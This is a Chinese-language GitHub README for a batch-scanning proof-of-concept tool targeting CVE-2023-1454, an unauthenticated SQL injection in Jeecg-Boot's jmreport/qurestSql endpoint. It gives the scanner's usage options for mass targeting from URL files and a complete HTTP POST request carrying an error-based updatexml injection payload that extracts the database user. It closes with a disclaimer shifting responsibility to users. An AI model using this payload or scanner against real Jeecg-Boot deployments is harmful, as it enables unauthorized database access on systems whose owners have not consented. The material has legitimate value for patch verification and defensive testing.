# CVE-2023-1454 Jeecg-Boot-qurestSql-SQLvuln

jmreport/qurestSql 未授权SQL注入批量扫描poc Jeecg-Boot是一款基于Spring Boot和Jeecg-Boot-Plus的快速开发平台，最新的jeecg-boot 3.5.0 中被爆出多个SQL注入漏洞。

## Usage

```
usage: CVE-2023-1454.py [-h] [-u URL] [-f FILE] [-t THREAD] [-T TIMEOUT] [-o OUTPUT] [-p PROXY]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target url(e.g. url.txt)
  -f FILE, --file FILE  Target file(e.g. url.txt)
  -t THREAD, --thread THREAD
                        Number of thread (default 5)
  -T TIMEOUT, --timeout TIMEOUT
                        Request timeout (default 3)
  -o OUTPUT, --output OUTPUT
                        Vuln url output file (e.g. result.txt)
  -p PROXY, --proxy PROXY
                        Request Proxy (e.g http://127.0.0.1:8080)
```

![image-20230620152520432](D:\tools\GitHub-exp\CVE-2023-1454 Jeecg-Boot-qurestSql-SQLvuln\github\img\1.png)

poc：

```
POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Content-Length: 128

{"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}
```

![image-20230620152841903](D:\tools\GitHub-exp\CVE-2023-1454 Jeecg-Boot-qurestSql-SQLvuln\github\img\2.png)

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，**均由使用者本人负责，作者不为此承担任何责任**。








